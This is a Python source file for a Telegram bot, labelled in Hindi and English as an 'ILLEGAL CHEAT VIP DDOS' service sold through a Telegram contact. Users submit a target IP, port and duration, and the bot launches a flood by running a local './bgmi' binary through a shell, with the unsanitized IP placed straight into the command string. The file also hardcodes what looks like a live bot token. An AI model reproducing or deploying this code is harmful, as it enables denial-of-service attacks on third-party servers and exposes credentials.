import os
import telebot
import logging
import asyncio
from threading import Thread

loop = asyncio.new_event_loop()

TOKEN = "8088623463:AAFpdYp6GMFRdTFOgBna3kI3MbBFhGmv-Cg"
FORWARD_CHANNEL_ID = -1002354151287

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

bot.attack_in_progress = False
bot.attack_duration = 0
bot.attack_start_time = 0
authorized_users = set()  # Set to store authorized users


@bot.message_handler(commands=['start'])
def handle_start(message):
    if message.chat.type == 'group':
        # Group: No authorization needed
        bot.reply_to(message, "✅ बॉट अब ग्रुप में एक्टिव है और इस्तेमाल के लिए तैयार है!")
    else:
        # Personal chat: Authorization required
        user_id = message.from_user.id
        username = message.from_user.username or "सेट नहीं"
        first_name = message.from_user.first_name or "सेट नहीं"
        last_name = message.from_user.last_name or ""

        full_name = f"{first_name} {last_name}".strip()
        status = "अनुमति लंबित है" if user_id not in authorized_users else "अनुमति स्वीकृत"

        welcome_message = f"""
*Welcome to 𝐈𝐋𝐋𝐄𝐆𝐀𝐋 𝐂𝐇𝐄𝐀𝐓 𝐕𝐈𝐏 𝐃𝐃𝐎𝐒 🚀  
ANY INQUIRYS AND BUY_ @ILLEGALCHEAT78

*आपकी जानकारी:*  
👤 नाम: {full_name}  
🔑 यूजरनेम: @{username}  
🆔 आईडी नंबर: {user_id}  
📋 स्थिति: {status}  

*Commands:*  
- /attack - अटैक शुरू करें (जैसे: IP Port Time)  
- /when - ATTACK TIME CHEAK COMMANDं  
"""

        if user_id not in authorized_users:
            bot.reply_to(message, welcome_message + "\n\n🔒 *बॉट का उपयोग करने के लिए पहले अनुमति प्राप्त करें।* /authorize का उपयोग करें।")
        else:
            bot.reply_to(message, welcome_message)


@bot.message_handler(commands=['authorize'])
def handle_authorize(message):
    if message.chat.type != 'private':
        bot.reply_to(message, "❗ यह कमांड केवल निजी चैट में उपयोग की जा सकती है।")
        return

    user_id = message.from_user.id
    if user_id in authorized_users:
        bot.reply_to(message, "✅ आप पहले से ही अनुमत हैं।")
    else:
        bot.reply_to(message, "🔒 आपकी अनुमति की रिक्वेस्ट भेजी गई है। कृपया एडमिन के स्वीकृत करने का इंतजार करें।")
        bot.send_message(FORWARD_CHANNEL_ID, f"🔔 *नई अनुमति अनुरोध!*\n\n"
                                             f"👤 नाम: {message.from_user.first_name}\n"
                                             f"🆔 आईडी: {user_id}\n"
                                             f"यूजरनेम: @{message.from_user.username or 'सेट नहीं'}\n"
                                             f"स्थिति: स्वीकृति लंबित\n\n"
                                             f"स्वीकृत करें: /approve {user_id}", parse_mode='Markdown')


@bot.message_handler(commands=['approve'])
def handle_approve(message):
    if message.chat.id != FORWARD_CHANNEL_ID:
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "❗ कृपया सही फॉर्मेट का उपयोग करें: `/approve <user_id>`।", parse_mode='Markdown')
        return

    user_id = int(args[1])
    authorized_users.add(user_id)
    bot.send_message(user_id, "✅ बधाई हो! अब आप बॉट का उपयोग कर सकते हैं।")
    bot.reply_to(message, f"यूजर {user_id} को सफलतापूर्वक अनुमत कर दिया गया है।")


@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    if message.chat.type == 'private' and message.from_user.id not in authorized_users:
        bot.reply_to(message, "❗ आप इस कमांड का उपयोग करने के लिए अनुमत नहीं हैं। कृपया /authorize से अनुमति मांगे।")
        return

    if bot.attack_in_progress:
        bot.send_message(message.chat.id, "⚠️ कृपया प्रतीक्षा करें! बॉट अभी एक अन्य अटैक पर काम कर रहा है।")
        return

    bot.send_message(message.chat.id, "💣 अटैक शुरू करने के लिए तैयार?\n"
                                      "टारगेट IP, पोर्ट और समय (सेकंड में) भेजें।\n"
                                      "उदाहरण: `167.67.25 6296 240` 🔥", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_command)


def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "❗ त्रुटि! कृपया IP, पोर्ट और समय सही तरीके से प्रदान करें।", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"🔒 पोर्ट {target_port} ब्लॉक कर दिया गया है।", parse_mode='Markdown')
            return
        if duration > 240:
            bot.send_message(message.chat.id, "⏳ अधिकतम समय 240 सेकंड है।", parse_mode='Markdown')
            return

        bot.attack_in_progress = True
        bot.attack_duration = duration
        bot.attack_start_time = loop.time()

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"🚀 अटैक लॉन्च किया गया!\n"
                                          f"टारगेट होस्ट: {target_ip}\n"
                                          f"टारगेट पोर्ट: {target_port}\n"
                                          f"समय: {duration} सेकंड!", parse_mode='Markdown')
        
        # New reply after attack launch with your updated message
        bot.send_message(message.chat.id, "⚠️ If you do not provide feedback, you may be banned from the group. plz provide feedback. @ILLEGALCHEAT78")

    except Exception as e:
        logging.error(f"Error processing attack command: {e}")
        bot.attack_in_progress = False


async def run_attack_command_async(target_ip, target_port, duration):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {target_ip} {target_port} {duration} {13} {600}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        stdout, stderr = await process.communicate()
        logging.info(f"Attack Output: {stdout.decode()}")
        if stderr:
            logging.error(f"Attack Error: {stderr.decode()}")
    except Exception as e:
        logging.error(f"Error during attack execution: {e}")
    finally:
        bot.attack_in_progress = False


@bot.message_handler(commands=['when'])
def handle_when_command(message):
    if not bot.attack_in_progress:
        bot.send_message(message.chat.id, "अभी कोई सक्रिय अटैक नहीं है।")
    else:
        elapsed_time = loop.time() - bot.attack_start_time
        remaining_time = max(0, bot.attack_duration - elapsed_time)
        bot.send_message(message.chat.id, f"वर्तमान अटैक के लिए शेष समय: {int(remaining_time)} सेकंड।")


def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()


if __name__ == '__main__':
    Thread(target=start_asyncio_thread).start()
    bot.infinity_polling()
